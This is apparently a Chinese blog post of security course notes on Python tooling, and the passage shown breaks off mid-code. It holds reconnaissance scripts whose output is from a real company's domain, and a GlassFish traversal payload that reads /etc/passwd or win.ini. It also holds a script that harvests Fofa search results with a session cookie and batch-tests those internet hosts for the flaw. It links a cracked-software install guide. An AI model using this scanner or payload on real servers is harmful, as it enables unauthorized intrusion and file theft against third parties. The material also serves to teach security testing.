<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>python开发“小迪安全课堂笔记” - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="python开发“小迪安全课堂笔记”" />
<meta property="og:description" content="python开发 Python 开发相关知识点：基础环境安装 Python 开发-内外网收集 Socket&amp;子域名&amp;DNS演示案例涉及资源： Python 开发-批量 Fofa&amp;SRC 提取&amp;POC 验证Python 开发-某漏洞 POC 验证批量脚本Python 开发-Fofa 搜索结果提取采集脚本Python 开发-教育 SRC 报告平台信息提取脚本涉及资源： Python 开发-多线程 Fuzz&amp;Waf 异或免杀&amp;爆破案例 1-Python 开发-简单多线程技术实现脚本案例 2-Python 开发-利用 FTP 模块实现协议爆破脚本案例 3-Python 开发-配合 Fuzz 实现免杀异或 Shell 脚本涉及资源 Python 开发-sqlmapapi&amp;Tamper&amp;Pocsuite案例 1-Sqlmap_Tamper 模块脚本编写绕过滤案例 2-SqlmapAPI 调用实现自动化 SQL 注入安全检测案例 3-Pocsuite3 漏扫框架二次开发 POC/EXP 引入使用涉及资源： Python 开发相关知识点： 1.开发基础环境配置说明
Windows10&#43;Pycharm
2.Python 开发学习的意义
学习相关安全工具原理掌握自定义工具及拓展开发解决实战中无工具或手工麻烦批量化等情况在二次开发 Bypass，日常任务，批量测试利用等方面均有帮助
如：SRC 批量收集并利用，AWD 批量利用获取 FLAG，CTF 加解密脚本等 3.本篇直播涉及的技术方向
Socket，爬虫，正则表达式，框架开发等
基础环境安装 1、环境搭建
Pycharm 安装教程（pojie 版）
https://zhuanlan.zhihu.com/p/379280063
Pycharm 安装好用得插件" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/f76ef4daf5902d57cc29fa2a10cb7ccd/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-05-10T20:59:37+08:00" />
<meta property="article:modified_time" content="2022-05-10T20:59:37+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">python开发“小迪安全课堂笔记”</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>python开发</h4> 
 <ul><li><ul><li><a href="#Python__3" rel="nofollow">Python 开发相关知识点：</a></li><li><a href="#_17" rel="nofollow">基础环境安装</a></li></ul> 
  </li><li><a href="#Python__SocketDNS_28" rel="nofollow">Python 开发-内外网收集 Socket&amp;子域名&amp;DNS</a></li><li><ul><li><a href="#_33" rel="nofollow">演示案例</a></li><li><a href="#_263" rel="nofollow">涉及资源：</a></li></ul> 
  </li><li><a href="#Python__FofaSRC_POC__269" rel="nofollow">Python 开发-批量 Fofa&amp;SRC 提取&amp;POC 验证</a></li><li><ul><li><a href="#Python__POC__274" rel="nofollow">Python 开发-某漏洞 POC 验证批量脚本</a></li><li><a href="#Python_Fofa__275" rel="nofollow">Python 开发-Fofa 搜索结果提取采集脚本</a></li><li><a href="#Python__SRC__416" rel="nofollow">Python 开发-教育 SRC 报告平台信息提取脚本</a></li><li><a href="#_451" rel="nofollow">涉及资源：</a></li></ul> 
  </li><li><a href="#Python__FuzzWaf__458" rel="nofollow">Python 开发-多线程 Fuzz&amp;Waf 异或免杀&amp;爆破</a></li><li><ul><li><a href="#_1Python__463" rel="nofollow">案例 1-Python 开发-简单多线程技术实现脚本</a></li><li><a href="#_2Python__FTP__467" rel="nofollow">案例 2-Python 开发-利用 FTP 模块实现协议爆破脚本</a></li><li><a href="#_3Python__Fuzz__Shell__543" rel="nofollow">案例 3-Python 开发-配合 Fuzz 实现免杀异或 Shell 脚本</a></li><li><a href="#_609" rel="nofollow">涉及资源</a></li></ul> 
  </li><li><a href="#Python_sqlmapapiTamperPocsuite_617" rel="nofollow">Python 开发-sqlmapapi&amp;Tamper&amp;Pocsuite</a></li><li><ul><li><a href="#_1Sqlmap_Tamper__623" rel="nofollow">案例 1-Sqlmap_Tamper 模块脚本编写绕过滤</a></li><li><a href="#_2SqlmapAPI__SQL__624" rel="nofollow">案例 2-SqlmapAPI 调用实现自动化 SQL 注入安全检测</a></li><li><a href="#_3Pocsuite3__POCEXP__701" rel="nofollow">案例 3-Pocsuite3 漏扫框架二次开发 POC/EXP 引入使用</a></li><li><a href="#_865" rel="nofollow">涉及资源：</a></li></ul> 
 </li></ul> 
</div> 
<p></p> 
<p><img src="https://images2.imgbox.com/f6/9f/DA98dVdQ_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="Python__3"></a>Python 开发相关知识点：</h3> 
<p><strong>1.开发基础环境配置说明</strong><br> Windows10+Pycharm</p> 
<p><strong>2.Python 开发学习的意义</strong></p> 
<ul><li>学习相关安全工具原理</li><li>掌握自定义工具及拓展开发</li><li>解决实战中无工具或手工麻烦批量化等情况</li><li>在二次开发 Bypass，日常任务，批量测试利用等方面均有帮助<br> 如：SRC 批量收集并利用，AWD 批量利用获取 FLAG，CTF 加解密脚本等</li></ul> 
<p><strong>3.本篇直播涉及的技术方向</strong><br> Socket，爬虫，正则表达式，框架开发等</p> 
<h3><a id="_17"></a>基础环境安装</h3> 
<p><em><strong>1、环境搭建</strong></em><br> Pycharm 安装教程（pojie 版）<br> https://zhuanlan.zhihu.com/p/379280063<br> Pycharm 安装好用得插件<br> https://www.bilibili.com/video/BV1ZV411p7H8?from=search&amp;seid=11507145613954022433<br> <em><strong>2、安装库</strong></em><br> 方法① 命令行安装：pip install 库名<br> 方法② pycharm 安装：文件-设置-项目-python 解释器-点击+号即可安装<br> <img src="https://images2.imgbox.com/56/53/YxZ5cwTA_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="Python__SocketDNS_28"></a>Python 开发-内外网收集 Socket&amp;子域名&amp;DNS</h2> 
<p>Socket 部分技术，进程命令执行，交互参数执行，NMAP 工具模块使用，异常处理等<br> <em><strong>脚本使用场景之一：src脚本挖掘思维导图</strong></em><br> 进行漏洞挖掘时，可用全自动化脚本。<br> <img src="https://images2.imgbox.com/47/a1/P9K5R2JD_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="_33"></a>演示案例</h3> 
<p>IP&amp;Whois&amp;系统指纹获取代码段-外网<br> CDN&amp;子域名&amp;端口扫描&amp;交互代码段-外网<br> IP&amp;计算机名&amp;存活主机&amp;端口扫描代码段-内网<br> Py 格式解析环境与可执行程序格式转换-Pyinstaller</p> 
<p><em><strong>外网代码集合</strong></em></p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> socket<span class="token punctuation">,</span>os
<span class="token keyword">import</span> time
<span class="token keyword">from</span> whois <span class="token keyword">import</span> whois
<span class="token keyword">import</span> sys

<span class="token comment">#域名反查IP地址</span>
<span class="token keyword">def</span> <span class="token function">ip_check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ip <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span>


<span class="token comment">#识别目标是否存在CDN</span>
<span class="token comment">#采用nslookup执行结果进行返回IP解析数据判断</span>
<span class="token comment">#利用python调用nslookup</span>
<span class="token comment">#cdn_data = os.system('nslookup www.xiaodi8.com')   实验室system可以执行命令，但是没有ip解析结果</span>
<span class="token comment">#print(cdn_data)</span>
<span class="token keyword">def</span> <span class="token function">cdn_check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    cdn_data <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'nslookup '</span><span class="token operator">+</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>cdn_data<span class="token punctuation">)</span>
    <span class="token comment">#由于ip地址是由x.x.x.x构造，那么就可以通过点数来判断是否存在cdn，&gt;10就存在cdn</span>
    <span class="token comment">#为什么是10呢？因为nslookip还显示域名信息存在“点”，当然这种判定并不准确</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>cdn_data<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment">#也可以加分支来直接显示是否存在cdn</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>cdn_data<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'存在CDN'</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'不存在CDN'</span><span class="token punctuation">)</span>


<span class="token comment">#端口扫描</span>
<span class="token comment">#1、原生自写socket协议tcp，udp扫描</span>
<span class="token comment">#2、调用第三方massan，nmap等扫描</span>
<span class="token comment">#3、调用系统工具脚本执行</span>
<span class="token keyword">def</span> <span class="token function">ports_check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ports <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">'80'</span><span class="token punctuation">,</span><span class="token string">'1433'</span><span class="token punctuation">,</span><span class="token string">'3306'</span><span class="token punctuation">,</span><span class="token string">'8080'</span><span class="token punctuation">,</span><span class="token string">"9090"</span><span class="token punctuation">,</span><span class="token string">'8089'</span><span class="token punctuation">,</span><span class="token string">'8888'</span><span class="token punctuation">}</span>
    server <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
    <span class="token keyword">for</span> port <span class="token keyword">in</span> ports <span class="token punctuation">:</span>
        result <span class="token operator">=</span> server<span class="token punctuation">.</span>connect_ex<span class="token punctuation">(</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> result <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>port <span class="token operator">+</span> <span class="token string">':open'</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>port <span class="token operator">+</span> <span class="token string">':close'</span><span class="token punctuation">)</span>



<span class="token comment">#whois查询</span>
<span class="token comment">#第三方库进行whois查询也可以利用网络接口查询</span>
<span class="token comment">#whois第三方库名是python-whois，安装whois库会报错</span>
<span class="token keyword">def</span> <span class="token function">whois_check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    who_data <span class="token operator">=</span> whois<span class="token punctuation">(</span><span class="token string">'www.xiaodi8.com'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>who_data<span class="token punctuation">)</span>



<span class="token comment">#子域名查询</span>
<span class="token comment">#1.利用字典记载爆破进行查询</span>
<span class="token comment">#2.利用 bing 或第三方接口进行查询</span>
<span class="token keyword">def</span> <span class="token function">zym_check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    urls  <span class="token operator">=</span> url<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'www'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> zym_data <span class="token keyword">in</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'D:\BaiduNetdiskDownload\Python开发源码资料-小迪安全\day76\dic.txt'</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#dic是子域名字典</span>
        zym_data <span class="token operator">=</span> zym_data<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>
        url <span class="token operator">=</span> zym_data<span class="token operator">+</span>urls
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            ip <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">'|'</span> <span class="token operator">+</span> ip<span class="token punctuation">)</span>
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">pass</span>

<span class="token comment">#主函数调用</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token comment">#python参数形式执行</span>
    check <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    url <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> check <span class="token operator">==</span> <span class="token string">'-all'</span><span class="token punctuation">:</span>
        ip_check<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
        whois_check<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
        cdn_check<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
        ports_check<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
        zym_check<span class="token punctuation">(</span>url<span class="token punctuation">)</span>

</code></pre> 
<p><em><strong>调用执行</strong></em><br> <img src="https://images2.imgbox.com/a9/53/a6KV8F2d_o.png" alt="在这里插入图片描述"></p> 
<pre><code>C:\Users\Administrator&gt;python D:/Applications/PycharmProjects/untitled/test123.py -all www.xueersi.com
175.22.33.241
{
  "domain_name": [
    "XIAODI8.COM",
    "xiaodi8.com"
  ],
  "registrar": "Alibaba Cloud Computing (Beijing) Co., Ltd.",
  "whois_server": "grs-whois.hichina.com",
  "referral_url": null,
  "updated_date": "2022-02-18 02:39:54",
  "creation_date": "2016-02-27 08:38:04",
  "expiration_date": "2023-02-27 08:38:04",
  "name_servers": [
    "DNS10.HICHINA.COM",
    "DNS9.HICHINA.COM"
  ],
  "status": "ok https://icann.org/epp#ok",
  "emails": "DomainAbuse@service.aliyun.com",
  "dnssec": "unsigned",
  "name": null,
  "org": null,
  "address": null,
  "city": null,
  "state": "Hu Bei",
  "zipcode": null,
  "country": "CN"
}
非权威应答:
服务器:  cache2.jljlptt.net.cn
Address:  202.98.5.68

名称:    www.xueersi.com.w.cdngslb.com
Addresses:  175.22.33.244
          139.215.235.242
          175.22.33.240
          139.215.235.239
          175.22.33.238
          175.22.33.242
          175.22.33.248
          139.215.235.238
          175.22.33.243
          175.22.33.239
          139.215.235.244
          139.215.235.241
          139.215.235.248
          139.215.235.240
          175.22.33.241
          139.215.235.243
Aliases:  www.xueersi.com


61
存在CDN
3306:close
8888:close
80:open
9090:close
1433:close
8089:close
8080:close
g.xueersi.com|120.133.71.66
i.xueersi.com|139.215.163.240
m.xueersi.com|221.203.223.104
s.xueersi.com|124.250.103.66
t.xueersi.com|120.133.71.66
v.xueersi.com|139.215.163.242
z.xueersi.com|221.203.223.104
www.xueersi.com|175.22.33.241
mall.xueersi.com|111.160.44.230
mail.xueersi.com|119.57.80.133
api.xueersi.com|218.60.78.226
api2.xueersi.com|218.60.78.223
ai.xueersi.com|134.175.75.151
app.xueersi.com|42.177.85.239
book.xueersi.com|120.133.71.86
read.xueersi.com|123.57.247.141
static.xueersi.com|113.1.0.74
beta.xueersi.com|120.133.71.68
bbs.xueersi.com|212.129.229.215
crm.xueersi.com|120.133.71.88
login.xueersi.com|14.205.95.89
open.xueersi.com|120.133.71.68
passport.xueersi.com|124.250.103.66
vip.xueersi.com|203.107.33.189
en.xueersi.com|119.57.80.133
push.xueersi.com|120.133.71.74
admin.xueersi.com|139.215.163.240
huodong.xueersi.com|221.203.223.104
activity.xueersi.com|221.203.223.105
account.xueersi.com|120.133.71.66
video.xueersi.com|120.133.71.66
Traceback (most recent call last):
  File "D:/Applications/PycharmProjects/untitled/test123.py", line 64, in zym_check
    ip = socket.gethostbyname(url)
socket.gaierror: [Errno 11001] getaddrinfo failed

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "D:/Applications/PycharmProjects/untitled/test123.py", line 79, in &lt;module&gt;
    ports_check(url)
  File "D:/Applications/PycharmProjects/untitled/test123.py", line 64, in zym_check
    ip = socket.gethostbyname(url)
KeyboardInterrupt

C:\Users\Administrator&gt;
</code></pre> 
<p><em>由于子域名扫描字典过，Ctrl c退出了</em></p> 
<p><em><strong>内网</strong></em><br> python可以支持各种第三方库，如nmap模块</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> nmap

<span class="token comment">#内网主机信息探针</span>
<span class="token comment">#1.原生利用ping进行获取</span>
<span class="token comment">#2.原生利用icmp,tcp,udp等协议获取</span>
<span class="token comment">#3.利用第三方模块库nmap等加载扫描获取</span>
<span class="token keyword">def</span> <span class="token function">nmapscan</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    nm <span class="token operator">=</span> nmap<span class="token punctuation">.</span>PortScanner<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        data<span class="token operator">=</span>nm<span class="token punctuation">.</span>scan<span class="token punctuation">(</span>hosts<span class="token operator">=</span><span class="token string">'192.168.76.0/24'</span><span class="token punctuation">,</span> arguments<span class="token operator">=</span><span class="token string">'-T4 -F'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>nm<span class="token punctuation">.</span>all_hosts<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>nm<span class="token punctuation">.</span>csv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> err<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    nmapscan<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<p><em><strong>Pyinstaller</strong></em><br> 将python文件准换为其他可执行程序<br> https://blog.csdn.net/weixin_47540149/article/details/122930395</p> 
<h3><a id="_263"></a>涉及资源：</h3> 
<p>https://www.jb51.net/softs/598504.html<br> https://www.cnblogs.com/csnd/p/11807823.html<br> https://pan.baidu.com/s/13y3U6jX3WUYmnfKnXT8abQ 提取码：xiao<br> https://pan.baidu.com/s/1tQS1mUelmEh3I68AL7yXGg 提取码：xiao</p> 
<h2><a id="Python__FofaSRC_POC__269"></a>Python 开发-批量 Fofa&amp;SRC 提取&amp;POC 验证</h2> 
<p><em><strong>本节知识点：</strong></em><br> Request 爬虫技术，lxml 数据提取，异常护理，Fofa 等使用说明。<br> <em><strong>学习目的：</strong></em><br> 掌握利用公开或 0day 漏洞进行批量化的收集及验证脚本开发。</p> 
<h3><a id="Python__POC__274"></a>Python 开发-某漏洞 POC 验证批量脚本</h3> 
<h3><a id="Python_Fofa__275"></a>Python 开发-Fofa 搜索结果提取采集脚本</h3> 
<p>漏洞说明：https://www.secpulse.com/archives/42277.html<br> 案例一+案例二<br> 1、漏洞信息<br> （1）漏洞名称：应用服务器 glassfish 任意文件读取<br> （2）漏洞 poc：</p> 
<pre><code>http://localhost:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c 0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
</code></pre> 
<p>注意：Linux 时读取/etc.passwd 文件，windows 则是其他文件，如 windows/win.ini<br> 2、 编写思路<br> （1）实现功能：批量的验证是否存在 glassfish 任意文件读取漏洞<br> （2）实现思路：</p> 
<pre><code>①筛选出存在 glassfish 的服务器 IP
具体实现：&gt;&gt;&gt;借助 fofa 搜索，搜索语法为"glassfish" &amp;&amp; port="4848";
&gt;&gt;&gt;通过爬虫爬取 fofa 搜索的全部结果；
&gt;&gt;&gt;通过 lxml 库提取爬取到的内容中的地址信息。
②批量验证存在 glassfish 的应用是否存在任意文件读取漏洞
两个 poc;分别对应 linux 和 windows 的
读取从 fofa 输出的结果，将漏洞 poc 中的地址进行替换，发起 get 请求，根据请求的响应状 态码来判断是否存在漏洞。
</code></pre> 
<p>3、注意事项</p> 
<pre><code>①读取文件时 windows 和 Linux 下的文件是不同的
②爬虫爬取 fofa 的输出结果编码成 utf-8，看起来更容易
③爬取 fofa 后面的内容时，需要将登录的 cookie 信息放入请求头中，cookie 从浏览器中获 取
</code></pre> 
<p>4、涉及知识点</p> 
<pre><code>（1）request 相关
requests 模块
Request 支持 HTTP 连接保持和连接池，支持使用 cookie 保持会话，支持文件上 传，支持自动响应内容的编码，支持国际化的 URL 和 POST 数据自动编码；使用 Requests 可以完成浏览器可有的任何操作
r.status_code #获取响应状态码
r.url #获取 
url r.content #获取内容以二进制文本显示
r.text #获取到的内容以 text 文本形式显示 
r.request.headers #请求头的信息 
r.headers #响应头信息 
r.cookies #获取 cookie
（2）文件读取
①参数：
w:写入模式；如果文件已经存在，清空文件内容；如果不存在，创建文件
x:写入模式；如果文件已经存在，抛出异常；如果不存在，创建文件并写入内容
a:追加模式；不覆盖文件的原始内容
②函数
f.write('hello') 写入 hello 
f.close() 关闭文件 
f.strip() 去掉换行（否则在读取文件内容并显示的时候， 每一行都会有多余的换行） 
f.read(10) 读取 10 个字节 
f.readline() 读取一行（也可以跟数字）
</code></pre> 
<p>5、实现代码</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> base64
<span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree
<span class="token keyword">import</span> time
<span class="token keyword">import</span> sys

<span class="token triple-quoted-string string">'''
url='http://186.202.17.69:4848/'
payload_linux='/'
payload_windows='/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'
#data_linux=requests.get(url+payload_linux) #获取请求后的返回源代码
#data_windows=requests.get(url+payload_windows) #获取请求后的返回源代码

data_linux=requests.get(url+payload_linux).status_code #获取请求后的返回状态码
data_windows=requests.get(url+payload_windows).status_code #获取请求后的返回状态码

if data_linux==200 or data_windows==200:
    print("yes")
else:
    print("no")

#print(data_linux.content.decode('utf-8'))
#print(data_windows.content.decode('utf-8'))

'''</span>
<span class="token triple-quoted-string string">'''
如何实现这个漏洞批量化：
1.获取到可能存在漏洞的地址信息-借助Fofa进行获取目标
    1.2 将请求的数据进行筛选
2.批量请求地址信息进行判断是否存在-单线程和多线程
'''</span>

<span class="token comment">#第1页</span>
<span class="token comment">#https://fofa.so/result?_=1608294544861&amp;page=2&amp;per_page=10&amp;qbase64=ImdsYXNzZmlzaCIgJiYgcG9ydD0iNDg0OCI%3D</span>
<span class="token keyword">def</span> <span class="token function">fofa_search</span><span class="token punctuation">(</span>search_data<span class="token punctuation">,</span>page<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">#search_data='"glassfish" &amp;&amp; port="4848" &amp;&amp; country="CN"'</span>
    headers<span class="token operator">=</span><span class="token punctuation">{<!-- --></span>
        <span class="token string">'cookie'</span><span class="token punctuation">:</span><span class="token string">'_fofapro_ars_session=01148af6062a060ccd5dd9a8483f5fea;result_per_page=20'</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">for</span> yeshu <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>page<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        url<span class="token operator">=</span><span class="token string">'https://fofa.so/result?page='</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>yeshu<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'&amp;qbase64='</span>
        search_data_bs<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>search_data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"utf-8"</span><span class="token punctuation">)</span>
        urls<span class="token operator">=</span>url<span class="token operator">+</span>search_data_bs
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'正在提取第'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>yeshu<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'页'</span><span class="token punctuation">)</span>
            result<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>urls<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>content
            <span class="token comment">#print(result.decode('utf-8'))</span>
            soup <span class="token operator">=</span> etree<span class="token punctuation">.</span>HTML<span class="token punctuation">(</span>result<span class="token punctuation">)</span>
            ip_data<span class="token operator">=</span>soup<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//div[@class="re-domain"]/a[@target="_blank"]/@href'</span><span class="token punctuation">)</span>
            ipdata<span class="token operator">=</span><span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>ip_data<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>ip_data<span class="token punctuation">)</span>
            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'ip.txt'</span><span class="token punctuation">,</span><span class="token string">'a+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>ipdata<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
                f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">pass</span>

<span class="token keyword">def</span> <span class="token function">check_vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload_linux<span class="token operator">=</span><span class="token string">'/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'</span>
    payload_windows<span class="token operator">=</span><span class="token string">'/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'</span>

    <span class="token keyword">for</span> ip <span class="token keyword">in</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'C:\Users\86135\Desktop\ip.txt'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        ip<span class="token operator">=</span>ip<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>
        windows_url<span class="token operator">=</span>ip<span class="token operator">+</span>payload_windows
        linxu_url<span class="token operator">=</span>ip<span class="token operator">+</span>payload_linux

        <span class="token keyword">try</span><span class="token punctuation">:</span>
